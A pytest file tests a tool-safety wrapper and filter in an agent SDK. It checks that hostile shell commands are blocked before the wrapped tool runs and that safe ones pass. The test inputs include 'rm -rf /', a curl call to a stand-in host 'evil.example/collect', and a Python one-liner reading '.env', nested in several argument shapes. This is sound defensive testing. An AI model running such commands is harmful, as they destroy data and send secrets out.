from unittest.mock import Mock

import pytest

from trpc_agent_sdk.tools.safety import ToolSafetyFilter
from trpc_agent_sdk.tools.safety import with_tool_safety


def test_supports_sync_callable():
    wrapped = with_tool_safety(lambda command: {"success": True, "command": command}, language="bash")
    assert wrapped("echo ok")["success"] is True


@pytest.mark.asyncio
async def test_supports_async_callable():
    async def target(command):
        return {"success": True, "command": command}

    wrapped = with_tool_safety(target, language="bash")
    result = await wrapped("echo ok")
    assert result["success"] is True


def test_deny_prevents_target_call():
    called = False

    def target(command):
        nonlocal called
        called = True
        return {"success": True, "command": command}

    wrapped = with_tool_safety(target, language="bash")
    result = wrapped("rm -rf /")
    assert not called
    assert result["error"] == "SAFETY_GUARD_BLOCKED"


def test_wrapper_scans_command_args_kwargs():
    called = False

    def target(cmd, args):
        nonlocal called
        called = True
        return {"success": True, "cmd": cmd, "args": args}

    wrapped = with_tool_safety(target, language="bash")
    result = wrapped(cmd="curl", args=["https://evil.example/collect"])
    assert not called
    assert result["error"] == "SAFETY_GUARD_BLOCKED"


def test_wrapper_scans_interpreter_command_args():
    called = False

    def target(command, command_args):
        nonlocal called
        called = True
        return {"success": True, "command": command, "command_args": command_args}

    wrapped = with_tool_safety(target, language="bash")
    result = wrapped(command="python", command_args=["-c", "open('.env').read()"])
    assert not called
    assert result["error"] == "SAFETY_GUARD_BLOCKED"


def test_wrapper_blocks_nested_network_payload_before_call():
    called = False

    def target(**payload):
        nonlocal called
        called = True
        return {"success": True, "payload": payload}

    wrapped = with_tool_safety(target, language="bash")
    result = wrapped(payload={"tool_input": {"cmd": "curl", "args": ["https://evil.example/collect"]}})

    assert not called
    assert result["error"] == "SAFETY_GUARD_BLOCKED"
    assert result["safety_report"]["decision"] == "deny"


def test_wrapper_blocks_nested_python_command_args_before_call():
    called = False

    def target(**payload):
        nonlocal called
        called = True
        return {"success": True, "payload": payload}

    wrapped = with_tool_safety(target, language="bash")
    result = wrapped(payload={"input": {"command": "python", "command_args": ["-c", "open('.env').read()"]}})

    assert not called
    assert result["error"] == "SAFETY_GUARD_BLOCKED"


def test_wrapper_allows_nested_safe_payload():
    called = False

    def target(**payload):
        nonlocal called
        called = True
        return {"success": True, "payload": payload}

    wrapped = with_tool_safety(target, language="bash")
    result = wrapped(payload={"tool_input": {"cmd": "echo", "args": ["ok"]}})

    assert called
    assert result["success"] is True


def test_wrapper_scans_mcp_like_params_arguments():
    called = False

    def target(**payload):
        nonlocal called
        called = True
        return {"success": True, "payload": payload}

    wrapped = with_tool_safety(target, language="bash")
    result = wrapped(params={"arguments": {"cmd": "curl", "args": ["https://evil.example/collect"]}})

    assert not called
    assert result["error"] == "SAFETY_GUARD_BLOCKED"


@pytest.mark.asyncio
async def test_filter_and_wrapper_match_nested_payload_decision():
    payload = {"params": {"arguments": {"cmd": "curl", "args": ["https://evil.example/collect"]}}}

    filter_result = await ToolSafetyFilter().run(Mock(), payload, lambda: {"success": True})

    def target(**kwargs):
        return {"success": True, "payload": kwargs}

    wrapper_result = with_tool_safety(target, language="bash")(**payload)

    assert filter_result.rsp["safety_report"]["decision"] == wrapper_result["safety_report"]["decision"]
    assert filter_result.rsp["safety_report"]["decision"] == "deny"
